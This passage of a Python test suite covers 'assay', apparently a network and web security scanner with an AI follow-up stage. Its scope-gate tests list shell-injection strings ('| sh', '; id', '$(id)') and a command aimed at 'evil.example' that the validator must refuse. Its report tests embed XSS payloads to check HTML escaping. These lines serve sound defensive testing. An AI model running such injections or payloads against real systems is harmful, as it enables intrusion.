        self.assertFalse(Proc(rc=0, out="", err="", skipped=True).ok)

    def test_a_clean_run_is_still_ok(self):
        from assay.tools import Proc
        self.assertTrue(Proc(rc=0, out="", err="").ok)


class ToolProgressLabelTests(unittest.TestCase):
    """The sink labels a command with whatever stage is currently talking."""

    def _ctx(self):
        from tests.stub import make_ctx
        ctx, _ = make_ctx([])
        seen = []
        ctx.progress = lambda stage, msg, advance=0: seen.append((stage, msg, advance))
        return ctx, seen

    def test_a_command_borrows_the_current_stage(self):
        ctx, seen = self._ctx()
        ctx.say("ports", "nmap -sV across 40 host(s)")
        ctx.tool_progress("nmap: running 2m30s - 45% done")
        self.assertEqual(seen[-1][0], "ports")

    def test_a_tick_does_not_earn_a_log_line_but_an_event_does(self):
        ctx, seen = self._ctx()
        ctx.tool_progress("nmap: running 2m30s")
        ctx.tool_progress("nmap: hit its 30m limit", tick=False)
        self.assertEqual([advance for _, _, advance in seen], [1, 0])

    def test_a_finding_does_not_steal_the_stage_label(self):
        """emit() says "finding", which is a channel, not where the scan is."""
        ctx, seen = self._ctx()
        ctx.say("crawl", "katana across 12 origin(s)")
        ctx.say("finding", "CHASE  something  [host]")
        ctx.tool_progress("katana: running 1m10s")
        self.assertEqual(seen[-1][0], "crawl")

    def test_an_error_does_not_steal_the_stage_label_either(self):
        """A failed candidate reports through "error"; it is still the probe
        stage that is running, and later heartbeats must say so - not "error",
        which on a host that keeps failing would otherwise stick forever."""
        ctx, seen = self._ctx()
        ctx.say("probe", "probing 2187 host:port candidate(s)")
        ctx.say("error", "probe failed: ReadTimeoutError")
        ctx.tool_progress("nuclei: running 1m10s")
        self.assertEqual(seen[-1][0], "probe")


class KeyListenerTests(unittest.TestCase):
    """assay.ui.KeyListener: single-keypress reads on a background thread,
    verified against a real pty - a mock here would only prove the mock
    works, not that cbreak mode and select() actually behave as assumed."""

    def _pty_pair(self):
        import pty
        try:
            master_fd, slave_fd = pty.openpty()
        except OSError as exc:
            # A sandboxed environment can deny pty allocation outright (seen
            # under Claude Code's own macOS sandbox: "out of pty devices").
            # That is a property of the sandbox, not of KeyListener - skip
            # rather than fail, the same way the rest of this suite treats
            # an environment gap it cannot do anything about.
            self.skipTest("pty allocation unavailable in this sandbox: %s" % exc)
        self.addCleanup(self._safe_close, master_fd)
        self.addCleanup(self._safe_close, slave_fd)
        return master_fd, slave_fd

    @staticmethod
    def _safe_close(fd):
        import os
        try:
            os.close(fd)
        except OSError:
            pass

    def _as_stdin(self, slave_fd):
        """Point sys.stdin at the pty's slave side for the duration of the
        test, restoring the real one afterward regardless of outcome."""
        import os, sys
        real_stdin = sys.stdin
        sys.stdin = os.fdopen(slave_fd, "r", closefd=False)

        def _restore():
            sys.stdin.close()
            sys.stdin = real_stdin

        self.addCleanup(_restore)

    def test_a_keypress_reaches_the_callback(self):
        import os, time
        from assay.ui import KeyListener
        master_fd, slave_fd = self._pty_pair()
        self._as_stdin(slave_fd)

        seen = []
        kl = KeyListener()
        kl.on_key = seen.append
        kl.start()
        self.addCleanup(kl.stop)
        try:
            os.write(master_fd, b"s")
            for _ in range(160):         # up to ~8s: listener polls every 0.25s; CI can be slow
                if seen:
                    break
                time.sleep(0.05)
        finally:
            kl.stop()
        self.assertEqual(seen, ["s"])

    def test_stop_restores_canonical_mode_and_echo(self):
        """cbreak turns ICANON and ECHO off; stop() must turn them back on.
        Checked as specific lflag bits, not the whole raw attrs tuple - on
        macOS a bare, session-less pty's kernel silently sets EXTPROC
        (0x20000000) on any tcsetattr() call regardless of what was asked
        for, which has nothing to do with whether this restored what it
        changed and would make a bit-exact comparison fail for reasons
        unrelated to KeyListener. ICANON/ECHO are what cbreak mode actually
        touches, and what a real terminal's usability afterward depends on."""
        import termios
        from assay.ui import KeyListener
        master_fd, slave_fd = self._pty_pair()
        self._as_stdin(slave_fd)
        before_lflag = termios.tcgetattr(slave_fd)[3]
        self.assertTrue(before_lflag & termios.ICANON)
        self.assertTrue(before_lflag & termios.ECHO)

        kl = KeyListener()
        kl.start()
        kl.stop()
        after_lflag = termios.tcgetattr(slave_fd)[3]
        self.assertTrue(after_lflag & termios.ICANON, "canonical mode must be back on")
        self.assertTrue(after_lflag & termios.ECHO, "echo must be back on")

    def test_cbreak_mode_is_actually_active_while_running(self):
        """The other half: ICANON/ECHO really are off during, not just
        correctly restored after - proving there was something to restore."""
        import termios
        from assay.ui import KeyListener
        master_fd, slave_fd = self._pty_pair()
        self._as_stdin(slave_fd)

        kl = KeyListener()
        kl.start()
        self.addCleanup(kl.stop)
        try:
            import time
            for _ in range(20):
                lflag = termios.tcgetattr(slave_fd)[3]
                if not (lflag & termios.ICANON):
                    break
                time.sleep(0.05)
            else:
                self.fail("cbreak mode was never observed as active")
            self.assertFalse(lflag & termios.ICANON)
        finally:
            kl.stop()

    def test_stop_without_start_is_a_safe_no_op(self):
        from assay.ui import KeyListener
        KeyListener().stop()   # must not raise

    def test_start_is_a_no_op_when_stdin_is_not_a_tty(self):
        """The default and by far the most common case: --quiet, a redirected
        input, or just not sitting at an interactive terminal. Verified with
        the real (non-tty, under a test runner) sys.stdin - not simulated."""
        import sys
        from assay.ui import KeyListener
        self.assertFalse(sys.stdin.isatty())
        kl = KeyListener()
        kl.start()
        self.addCleanup(kl.stop)
        self.assertIsNone(kl._thread, "no thread should have been spawned at all")

    def test_a_second_start_while_already_running_is_a_no_op(self):
        import os
        from assay.ui import KeyListener
        master_fd, slave_fd = self._pty_pair()
        self._as_stdin(slave_fd)
        kl = KeyListener()
        kl.start()
        self.addCleanup(kl.stop)
        first_thread = kl._thread
        kl.start()
        self.assertIs(kl._thread, first_thread)


class DashboardErrorStageTests(unittest.TestCase):
    """Same bug, the terminal-facing half: the header must not read "stage
    error" for as long as failures keep recurring."""

    def test_an_error_message_does_not_relabel_the_header(self):
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("probe", "probing 2187 host:port candidate(s)")
        d.progress("error", "probe failed: ReadTimeoutError")
        self.assertEqual(d.stage, "probe")

    def test_the_stage_clock_does_not_reset_on_an_error(self):
        import time
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("probe", "probing 2187 host:port candidate(s)")
        started = d.stage_started
        time.sleep(0.05)
        d.progress("error", "probe failed: ReadTimeoutError")
        self.assertEqual(d.stage_started, started)

    def test_an_error_is_still_logged(self):
        """Silencing the mislabel must not silence the failure itself."""
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("probe", "probing 2187 host:port candidate(s)")
        d.progress("error", "probe failed: ReadTimeoutError")
        self.assertTrue(any("probe failed" in line for line in d.log))

    def test_a_real_stage_after_an_error_still_relabels_normally(self):
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("probe", "probing 2187 host:port candidate(s)")
        d.progress("error", "probe failed: ReadTimeoutError")
        d.progress("analyze", "running secrets")
        self.assertEqual(d.stage, "analyze")


class StreamTimeoutTests(unittest.TestCase):
    """stream_lines enforces its timeout, so a cut-off must not read as done."""

    CHATTY = ["bash", "-c", "for i in $(seq 1 200); do echo x; sleep 0.02; done"]

    def test_the_deadline_actually_stops_the_stream(self):
        import time
        from assay import tools
        t = time.time()
        out = list(tools.stream_lines(self.CHATTY, timeout=0.3))
        self.assertLess(len(out), 200, "the tool should have been cut short")
        self.assertLess(time.time() - t, 3.0, "the deadline should have fired")

    def test_a_cut_off_stream_says_so_on_the_progress_sink(self):
        """Partial output is indistinguishable from complete output otherwise."""
        from assay import tools
        told = []
        with _sink(told):
            list(tools.stream_lines(self.CHATTY, timeout=0.3))
        events = [m for m, tick in told if not tick]
        self.assertEqual(len(events), 1, told)
        self.assertIn("results are partial", events[0])
        self.assertIn("bash", events[0], "the message must name the tool")

    def test_a_timeout_is_recorded_once_not_twice(self):
        from assay import tools
        recs = []
        original = tools._record_failure
        tools._record_failure = lambda cmd, err: recs.append(str(err))
        try:
            list(tools.stream_lines(self.CHATTY, timeout=0.3))
        finally:
            tools._record_failure = original
        self.assertEqual(len(recs), 1, "the kill and its returncode are one event")
        self.assertIn("timed out", recs[0])

    def test_a_tool_that_finishes_in_time_reports_no_timeout(self):
        from assay import tools
        told = []
        with _sink(told):
            out = list(tools.stream_lines(["bash", "-c", "echo a; echo b"],
                                          timeout=30.0))
        self.assertEqual(out, ["a", "b"])
        self.assertEqual([m for m, tick in told if not tick], [])


class FollowupGateTests(unittest.TestCase):
    """The three mechanical gates. --ai-followup does not relax any of them."""

    def _cfg(self, allow=("app.test",), **kw):
        from assay.config import Config, Scope
        return Config(targets=list(allow), scope=Scope(allow=list(allow)), **kw)

    def test_allow_listed_in_scope_command_is_ready(self):
        from assay import followup
        v = followup.vet("curl -s https://app.test/actuator/env", self._cfg())
        self.assertTrue(v.ok, v.reason)

    def test_binary_off_the_allow_list_is_refused(self):
        from assay import followup
        for text in ("bash -c id", "sh -c whoami", "pip install x", "nc app.test 80"):
            self.assertFalse(followup.vet(text, self._cfg()).ok, text)

    def test_shell_metacharacters_refuse_rather_than_escape(self):
        from assay import followup
        for text in ("curl https://app.test/ | sh",
                     "curl https://app.test/ ; id",
                     "curl https://app.test/$(id)",
                     "curl https://app.test/ && id"):
            v = followup.vet(text, self._cfg())
            self.assertFalse(v.ok, text)

    def test_one_out_of_scope_host_refuses_the_whole_command(self):
        from assay import followup
        v = followup.vet("curl -s https://evil.example/x", self._cfg())
        self.assertFalse(v.ok)
        self.assertIn("out of scope", v.reason)


class AiFollowupStageTests(unittest.TestCase):
    """--ai-followup executes unattended, so its stop conditions are the test."""

    class _Store:
        def __init__(self, cmds):
            self._cmds, self.statuses = cmds, []

        def iter_findings(self):
            from assay.models import Finding
            return [Finding(title="t", target="app.test", severity="low",
                            confidence="confirmed", module="m", category="c",
                            cwe="", impact="i", detail="d", repro="r")]

        def ai_for(self, fid):
            return {"commands": self._cmds}

        def ai_map(self):
            return {f.fingerprint(): {"commands": self._cmds}
                    for f in self.iter_findings()}

        def set_status(self, fid, status, notes=""):
            self.statuses.append((status, notes))

    def _cfg(self, out_dir, allow=("app.test",), with_map=True, **kw):
        import json, os
        from assay.config import Config, Scope
        cfg = Config(targets=list(allow), out_dir=out_dir,
                     scope=Scope(allow=list(allow)), **kw)
        if with_map:
            with open(os.path.join(out_dir, "redaction-map.json"), "w") as fh:
                json.dump({"reverse": {"[HOST-01]": "app.test"}, "counters": {}}, fh)
        return cfg

    def _args(self):
        import argparse
        return argparse.Namespace(ai_followup_limit=25, ai_followup_timeout=5.0)

    def _no_exec(self):
        """Record what would have run instead of running it."""
        from assay import followup
        calls = []
        original = followup.run
        followup.run = lambda cmd, timeout=120.0: (calls.append(cmd.display),
                                                   setattr(cmd, "rc", 0),
                                                   setattr(cmd, "output", ""),
                                                   cmd)[-1]
        self.addCleanup(lambda: setattr(followup, "run", original))
        return calls

    def test_safe_mode_stops_the_stage(self):
        import tempfile
        from assay import cli
        calls = self._no_exec()
        cfg = self._cfg(tempfile.mkdtemp(), safe_mode=True)
        ran = cli.run_ai_followup(self._Store(["curl https://app.test/"]),
                                  cfg, self._args())
        self.assertEqual((ran, calls), (0, []))

    def test_permissive_scope_stops_the_stage(self):
        import tempfile
        from assay import cli
        from assay.config import Config, Scope
        calls = self._no_exec()
        cfg = self._cfg(tempfile.mkdtemp())
        cfg.scope = Scope()                      # no allow rules == permissive
        ran = cli.run_ai_followup(self._Store(["curl https://app.test/"]),
                                  cfg, self._args())
        self.assertEqual((ran, calls), (0, []))

    def test_a_missing_redaction_map_stops_the_stage(self):
        import tempfile
        from assay import cli
        calls = self._no_exec()
        cfg = self._cfg(tempfile.mkdtemp(), with_map=False)
        ran = cli.run_ai_followup(self._Store(["curl https://app.test/"]),
                                  cfg, self._args())
        self.assertEqual((ran, calls), (0, []))

    def test_out_of_scope_command_is_refused_unattended(self):
        import tempfile
        from assay import cli
        calls = self._no_exec()
        cfg = self._cfg(tempfile.mkdtemp())
        ran = cli.run_ai_followup(self._Store(["curl https://evil.example/x"]),
                                  cfg, self._args())
        self.assertEqual((ran, calls), (0, []))

    def test_an_in_scope_allow_listed_command_runs_and_is_recorded(self):
        import tempfile
        from assay import cli
        calls = self._no_exec()
        store = self._Store(["curl -s https://app.test/actuator/env"])
        ran = cli.run_ai_followup(store, self._cfg(tempfile.mkdtemp()), self._args())
        self.assertEqual(ran, 1)
        self.assertEqual(len(calls), 1)
        self.assertEqual(store.statuses[0][0], "followup-run")

    def test_pseudonyms_are_resolved_before_vetting(self):
        """The model writes [HOST-01]; un-redaction happens before the scope check."""
        import tempfile
        from assay import cli
        calls = self._no_exec()
        ran = cli.run_ai_followup(self._Store(["curl -s https://[HOST-01]/x"]),
                                  self._cfg(tempfile.mkdtemp()), self._args())
        self.assertEqual(ran, 1)
        self.assertIn("app.test", calls[0])


class PayloadBuiltOnceTests(unittest.TestCase):
    def test_analyze_does_not_rebuild_a_payload_it_was_given(self):
        """Redaction is the expensive pass; the CLI already ran it."""
        import tempfile
        from assay import ai as ai_mod
        from assay.models import Finding
        from assay.redact import Redactor

        findings = [Finding(title="x", target="10.0.0.5", severity="low",
                            confidence="confirmed", module="m", category="c",
                            cwe="", impact="i", detail="d", repro="r")]
        redactor = Redactor()
        cfg = ai_mod.AIConfig(enabled=True, dry_run=True)
        payload, leaks = ai_mod.build_payload(findings, {}, cfg, redactor)
        self.assertEqual(leaks, [])

        calls = {"n": 0}
        original = ai_mod.build_payload

        def counting(*a, **k):
            calls["n"] += 1
            return original(*a, **k)

        ai_mod.build_payload = counting
        try:
            ai_mod.analyze(findings, {}, cfg, redactor, tempfile.mkdtemp(),
                           payload=payload)
        finally:
            ai_mod.build_payload = original
        self.assertEqual(calls["n"], 0, "analyze rebuilt a payload it was handed")

    def test_analyze_still_builds_one_when_not_given_it(self):
        import tempfile
        from assay import ai as ai_mod
        from assay.models import Finding
        from assay.redact import Redactor
        findings = [Finding(title="x", target="10.0.0.5", severity="low",
                            confidence="confirmed", module="m", category="c",
                            cwe="", impact="i", detail="d", repro="r")]
        out = ai_mod.analyze(findings, {}, ai_mod.AIConfig(enabled=True, dry_run=True),
                             Redactor(), tempfile.mkdtemp())
        self.assertTrue(out["dry_run"])


class CodenamePromptTests(unittest.TestCase):
    """-n is optional because the CLI asks; it must never block a pipe."""

    def _tty(self, answer):
        import sys, assay.cli as cli
        from assay import ui
        saved = (sys.stdin.isatty, sys.stdout.isatty, ui.console.input)
        sys.stdin.isatty = lambda: True
        sys.stdout.isatty = lambda: True
        if isinstance(answer, BaseException):
            def raiser(*a, **k):
                raise answer
            ui.console.input = raiser
        else:
            ui.console.input = lambda *a, **k: answer
        self.addCleanup(self._restore, saved)
        return cli

    def _restore(self, saved):
        import sys
        from assay import ui
        sys.stdin.isatty, sys.stdout.isatty, ui.console.input = saved

    def test_no_tty_never_prompts(self):
        import assay.cli as cli
        self.assertEqual(cli._ask_codename(["10.20.0.0/24"]), "")

    def test_typed_codename_is_trimmed(self):
        cli = self._tty("  ZESTY WOMBAT  ")
        self.assertEqual(cli._ask_codename(["10.20.0.0/24"]), "ZESTY WOMBAT")

    def test_empty_answer_falls_back_to_target_derived_name(self):
        cli = self._tty("")
        self.assertEqual(cli._ask_codename(["10.20.0.0/24"]), "")

    def test_interrupt_is_not_fatal(self):
        for exc in (KeyboardInterrupt(), EOFError()):
            cli = self._tty(exc)
            self.assertEqual(cli._ask_codename(["a.test"]), "")


class RunDirTests(unittest.TestCase):
    def test_codename_wins_over_target_derived_name(self):
        from assay.config import Config
        c = Config(targets=["10.20.0.0/24", "a.test"], codename="ZESTY WOMBAT")
        self.assertTrue(c.apply_run_dir("/out").endswith("ZESTY-WOMBAT"))

    def test_targets_name_the_folder_without_a_codename(self):
        from assay.config import Config
        self.assertTrue(
            Config(targets=["https://app.example.com"]).apply_run_dir("/out")
            .endswith("app.example.com"))

    def test_multiple_targets_get_a_stable_disambiguated_name(self):
        from assay.config import Config
        a = Config(targets=["a.test", "b.test"]).apply_run_dir("/out")
        b = Config(targets=["b.test", "a.test"]).apply_run_dir("/out")
        self.assertEqual(a, b, "name must not depend on argument order")

    def test_flat_mode_writes_into_the_root(self):
        from assay.config import Config
        self.assertEqual(
            Config(targets=["a.test"]).apply_run_dir("/out", flat=True), "/out")


class StageLogTests(unittest.TestCase):
    """A durable record of which stages ran and how they ended - what
    --resume needs to know beyond "does a file exist"."""

    def _store(self):
        import tempfile, os
        from assay.store import Store
        return Store(os.path.join(tempfile.mkdtemp(), "assay.db"))

    def test_an_unattempted_stage_has_no_status(self):
        s = self._store()
        s.start_run("standard", ["t"])
        self.assertIsNone(s.stage_status("urls"))
        s.close()

    def test_a_completed_stage_is_reported_as_such(self):
        s = self._store()
        s.start_run("standard", ["t"])
        sid = s.stage_started("probe")
        s.stage_finished(sid, "completed")
        self.assertEqual(s.stage_status("probe"), "completed")
        s.close()

    def test_a_skipped_stage_is_distinguished_from_completed(self):
        s = self._store()
        s.start_run("standard", ["t"])
        sid = s.stage_started("urls")
        s.stage_finished(sid, "skipped")
        self.assertEqual(s.stage_status("urls"), "skipped")
        s.close()

    def test_status_reflects_the_most_recent_attempt_not_the_first(self):
        """A stage retried on a later run must not still read as whatever it
        was the first time - --resume needs to know what happened LAST."""
        s = self._store()
        s.start_run("standard", ["t"])
        s.stage_finished(s.stage_started("ports"), "skipped")
        s.start_run("standard", ["t"])
        s.stage_finished(s.stage_started("ports"), "completed")
        self.assertEqual(s.stage_status("ports"), "completed")
        s.close()

    def test_status_persists_across_a_reopened_database(self):
        """--resume runs as a fresh process against the same out_dir - the
        in-memory Store instance from the prior run is long gone."""
        from assay.store import Store
        s = self._store()
        db_path = s.path
        s.start_run("standard", ["t"])
        s.stage_finished(s.stage_started("probe"), "completed")
        s.close()

        reopened = Store(db_path)
        self.assertEqual(reopened.stage_status("probe"), "completed")
        reopened.close()

    def test_a_stage_left_running_when_the_process_died_is_visible(self):
        """No stage_finished() call ever landed - the process was killed or
        crashed mid-stage. --resume must be able to tell "never finished"
        apart from "completed", not default to trusting it."""
        s = self._store()
        s.start_run("standard", ["t"])
        s.stage_started("urls")
        self.assertEqual(s.stage_status("urls"), "running")
        s.close()

    def test_history_reports_one_row_per_stage_the_most_recent_attempt(self):
        s = self._store()
        s.start_run("standard", ["t"])
        s.stage_finished(s.stage_started("resolve"), "completed")
        s.stage_finished(s.stage_started("ports"), "skipped")
        s.stage_finished(s.stage_started("ports"), "completed")  # retried
        history = {r["stage"]: r["status"] for r in s.stage_history()}
        self.assertEqual(history, {"resolve": "completed", "ports": "completed"})
        s.close()


class WebTargetPersistenceTests(unittest.TestCase):
    """save_web_target()/web_targets(): a lossless round trip, since the
    version this replaced only kept 3 of WebTarget's dozen-plus fields -
    silently, which --resume hydrating ctx.web from it would have inherited."""

    def _store(self):
        import tempfile, os
        from assay.store import Store
        return Store(os.path.join(tempfile.mkdtemp(), "assay.db"))

    def _wt(self, **kw):
        from assay.models import WebTarget
        base = dict(url="https://a.test/", host="a.test", port=443, scheme="https",
                   status=200, title="Home", server="nginx", tech=["nginx"],
                   content_type="text/html", length=1234, words=88,
                   headers={"X-Frame-Options": "DENY"}, body_sample="<html>hi</html>",
                   cert={"cn": "a.test"}, redirect_chain=["https://a.test/old"],
                   final_url="https://a.test/", favicon_hash=-123456)
        base.update(kw)
        return WebTarget(**base)

    def test_every_field_survives_the_round_trip(self):
        s = self._store()
        s.start_run("standard", ["t"])
        wt = self._wt()
        s.save_web_target(wt)
        [back] = s.web_targets()
        for f in dataclasses.fields(wt):
            self.assertEqual(getattr(back, f.name), getattr(wt, f.name), f.name)
        s.close()

    def test_a_row_saved_before_this_existed_still_hydrates(self):
        """The old, lossy save_web() call this replaced - a database from
        before this fix must not make web_targets() raise."""
        s = self._store()
        s.start_run("standard", ["t"])
        s.save_web("https://old.test/", "old.test", 443, 200, "Old", "nginx",
                  ["nginx"], {"content_type": "text/html", "final_url": "https://old.test/",
                              "length": 500})
        [wt] = s.web_targets()
        self.assertEqual(wt.url, "https://old.test/")
        self.assertEqual(wt.scheme, "https", "derived from the URL when data lacks it")
        self.assertEqual(wt.length, 500)
        self.assertEqual(wt.headers, {}, "absent, not fabricated")
        s.close()

    def test_a_plain_http_url_with_no_stored_scheme_still_derives_it(self):
        s = self._store()
        s.start_run("standard", ["t"])
        s.save_web("http://old.test/", "old.test", 80, 200, "", "", [], {})
        [wt] = s.web_targets()
        self.assertEqual(wt.scheme, "http")
        s.close()

    def test_multiple_targets_all_come_back(self):
        s = self._store()
        s.start_run("standard", ["t"])
        s.save_web_target(self._wt(url="https://a.test/", host="a.test"))
        s.save_web_target(self._wt(url="https://b.test/", host="b.test", port=8443))
        self.assertEqual(sorted(wt.url for wt in s.web_targets()),
                         ["https://a.test/", "https://b.test/"])
        s.close()

    def test_saving_the_same_url_twice_updates_not_duplicates(self):
        s = self._store()
        s.start_run("standard", ["t"])
        s.save_web_target(self._wt(title="First"))
        s.save_web_target(self._wt(title="Second"))
        targets = s.web_targets()
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].title, "Second")
        s.close()


class DiffTests(unittest.TestCase):
    def _store(self):
        import tempfile, os
        from assay.store import Store
        return os.path.join(tempfile.mkdtemp(), "assay.db")

    def _add(self, s, title, target="https://a/x"):
        from assay.models import Evidence, Finding
        s.add_finding(Finding(title=title, target=target, severity="high",
                              confidence="confirmed", module="m", impact="i",
                              evidence=[Evidence(kind="http", output="x")]))

    def test_second_run_reports_only_the_delta(self):
        from assay.store import Store
        path = self._store()
        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "A"); self._add(s, "B")
        s.save_web("https://a/", "a", 443, 200, "", "", [], {})
        s.finish_run(); s.close()

        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "A"); self._add(s, "C")
        s.save_web("https://b/", "b", 443, 200, "", "", [], {})
        d = s.diff()
        self.assertFalse(d["is_first_run"])
        self.assertEqual([f.title for f in d["new_findings"]], ["C"])
        self.assertEqual([f.title for f in d["gone_findings"]], ["B"])
        self.assertEqual(d["new_web"], ["https://b/"])
        s.close()

    def test_first_run_is_flagged_rather_than_diffed(self):
        from assay.store import Store
        s = Store(self._store()); s.start_run("standard", ["t"])
        self._add(s, "A")
        d = s.diff()
        self.assertTrue(d["is_first_run"])
        self.assertIsNone(d["previous"])
        s.close()

    def test_repeat_finding_is_not_reported_as_new(self):
        from assay.store import Store
        path = self._store()
        s = Store(path); s.start_run("standard", ["t"]); self._add(s, "A")
        fid = list(s.iter_findings())[0].fingerprint()
        s.finish_run(); s.close()
        s = Store(path); s.start_run("standard", ["t"]); self._add(s, "A")
        self.assertFalse(s.is_new_this_run(fid))
        self.assertEqual(s.diff()["new_findings"], [])
        s.close()


class SchemaMigrationTests(unittest.TestCase):
    """Upgrading must not destroy an existing engagement's history.

    CREATE TABLE IF NOT EXISTS leaves an existing table alone, so every column
    added after the first release has to be migrated in. Without this the first
    scan after a git pull crashes, and takes the run history that `assay diff`
    depends on with it.
    """

    LEGACY = """
    CREATE TABLE runs (id INTEGER PRIMARY KEY AUTOINCREMENT, started REAL,
      finished REAL, profile TEXT, targets TEXT, args TEXT);
    CREATE TABLE findings (fid TEXT PRIMARY KEY, run_id INTEGER, title TEXT,
      target TEXT, severity TEXT, confidence TEXT, category TEXT, cwe TEXT,
      module TEXT, impact TEXT, detail TEXT, repro TEXT, refs TEXT, tags TEXT,
      evidence TEXT, score REAL, triage TEXT, created REAL,
      status TEXT DEFAULT 'new', notes TEXT);
    CREATE TABLE hosts (host TEXT PRIMARY KEY, ip TEXT, data TEXT, updated REAL);
    CREATE TABLE web (url TEXT PRIMARY KEY, host TEXT, port INTEGER,
      status INTEGER, title TEXT, server TEXT, tech TEXT, data TEXT,
      updated REAL);
    """

    def _legacy_db(self):
        import os, sqlite3, tempfile
        path = os.path.join(tempfile.mkdtemp(), "assay.db")
        c = sqlite3.connect(path)
        c.executescript(self.LEGACY)
        c.execute("INSERT INTO runs (started, profile, targets)"
                  " VALUES (1,'standard','[]')")
        c.execute("INSERT INTO findings (fid,run_id,title,target,severity,"
                  "confidence,score,triage,created,refs,tags,evidence) VALUES"
                  " ('old',1,'Legacy finding','https://a/','high','firm',50,"
                  "'LOOK',1,'[]','[]','[]')")
        c.execute("INSERT INTO web VALUES"
                  " ('https://a/','a',443,200,'','','[]','{}',1)")
        c.commit(); c.close()
        return path

    def _add(self, s, title):
        from assay.models import Evidence, Finding
        s.add_finding(Finding(title=title, target="https://a/x", severity="high",
                              confidence="confirmed", module="m", impact="i",
                              evidence=[Evidence(kind="http", output="x")]))

    def test_writing_to_a_legacy_database_succeeds(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        self._add(s, "New finding")
        s.save_web("https://b/", "b", 443, 200, "", "", [], {})
        s.close()

    def test_legacy_rows_survive_the_upgrade(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        titles = [f.title for f in s.iter_findings()]
        self.assertIn("Legacy finding", titles)
        s.close()

    def test_pre_existing_findings_are_not_reported_as_new(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        self._add(s, "New finding")
        d = s.diff()
        self.assertEqual([f.title for f in d["new_findings"]], ["New finding"])
        s.close()

    def test_migration_is_idempotent(self):
        from assay.store import Store
        path = self._legacy_db()
        for _ in range(3):
            s = Store(path); s.start_run("standard", ["t"]); s.close()

    def test_database_is_self_contained_after_close(self):
        """A copy of the .db alone must carry the findings."""
        import os, shutil, sqlite3, tempfile
        from assay.store import Store
        path = self._legacy_db()
        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "Persisted"); s.finish_run(); s.close()
        copy = os.path.join(tempfile.mkdtemp(), "copy.db")
        shutil.copy(path, copy)
        n = sqlite3.connect(copy).execute(
            "SELECT COUNT(*) FROM findings WHERE title='Persisted'").fetchone()[0]
        self.assertEqual(n, 1)


class AccountingTests(unittest.TestCase):
    def test_failed_requests_are_counted_not_dropped(self):
        """A summary that only counts successes under-reports the traffic sent."""
        from assay.config import Config, Scope
        from assay.net import HttpClient
        c = HttpClient(Config(scope=Scope(allow=["192.0.2.0/24"]),
                              timeout=0.6, retries=0))
        c.get("https://192.0.2.7/")
        self.assertEqual(c.attempts, 1)
        self.assertEqual(c.failures, 1)
        self.assertEqual(c.count, 0)

    def test_out_of_scope_requests_are_not_counted_as_attempts(self):
        from assay.config import Config, Scope
        from assay.net import HttpClient
        c = HttpClient(Config(scope=Scope(allow=["target.tld"])))
        c.get("https://evil.tld/")
        self.assertEqual(c.attempts, 0, "nothing was sent, so nothing was attempted")


class ReportRenderTests(unittest.TestCase):
    """The report was crashing for a whole release because nothing rendered one.

    A format-string argument was added without its placeholder, so every field
    after it shifted. Structural checks on a pre-generated file cannot catch
    that - only actually building a report can.
    """

    HOSTILE = '</script><img src=x onerror=alert(1)>'
    ATTR_BREAK = '" onmouseover="alert(2)'

    def _store(self, **kw):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        s.add_finding(Finding(
            title=kw.get("title", "Exposed .env file"),
            target=kw.get("target", "https://a.test/.env"),
            severity="critical", confidence="confirmed", module="exposure",
            category="A05 Security Misconfiguration", cwe="CWE-540",
            impact=kw.get("impact", "Live credentials in cleartext."),
            detail=kw.get("detail", "matched DB_PASSWORD="),
            repro=kw.get("repro", "curl -sSk https://a.test/.env"),
            tags=["exposure", "verified"],
            evidence=[Evidence(kind="http", label="proof",
                               output=kw.get("evidence", "DB_PASSWORD=x"))]))
        return s

    def _build(self, store, **kw):
        import os, tempfile
        from assay import report
        out = os.path.join(tempfile.mkdtemp(), "r.html")
        return open(report.build(store, {"hosts": 1, "web": 1, "requests": 5,
                                         "duration": 2.0}, out, **kw)).read()

    def test_report_builds_at_all(self):
        html = self._build(self._store())
        self.assertIn("Exposed .env file", html)
        self.assertIn("</html>", html)

    def test_report_builds_with_no_findings(self):
        import os, tempfile
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        self.assertIn("</html>", self._build(s))

    def test_live_and_final_variants_both_build(self):
        s = self._store()
        # 'livebar' also appears in the stylesheet, so match the element.
        self.assertIn('id="livebar"', self._build(s, live=True))
        self.assertNotIn('id="livebar"', self._build(s, live=False))

    def test_report_with_ai_and_chains_builds(self):
        s = self._store()
        fid = list(s.iter_findings())[0].fingerprint()
        s.save_ai({"triage": [{"id": fid, "verdict": "report", "priority": 1,
                               "false_positive_risk": "low", "rationale": "r",
                               "impact_statement": "i", "next_steps": ["do x"],
                               "commands": ["curl https://a.test/"]}],
                   "chains": [{"name": "c", "combined_severity": "critical",
                               "finding_ids": [fid], "combined_impact": "x",
                               "steps": ["s1"]}]})
        html = self._build(s, ai={"summary": "s", "_model": "m"})
        self.assertIn("Attack chains", html)
        self.assertIn("AI triage", html)

    def test_hostile_content_cannot_break_out_of_the_page(self):
        """Titles, evidence and URLs all come from the target."""
        import re
        s = self._store(title="T " + self.HOSTILE, impact="I " + self.ATTR_BREAK,
                        detail=self.HOSTILE, evidence=self.HOSTILE,
                        target="https://a.test/" + self.HOSTILE)
        html = self._build(s)
        self.assertNotIn("</script><img", html)
        self.assertNotIn('" onmouseover="alert', html)
        self.assertFalse(re.search(r"<img\s[^>]*onerror", html),
                         "payload parsed as markup")
        for m in re.finditer(r"<script[^>]*>(.*?)</script>", html, re.S):
            self.assertNotIn("alert(", m.group(1),
                             "hostile content reached a script block")

    def test_zero_counts_render_as_zero_not_blank(self):
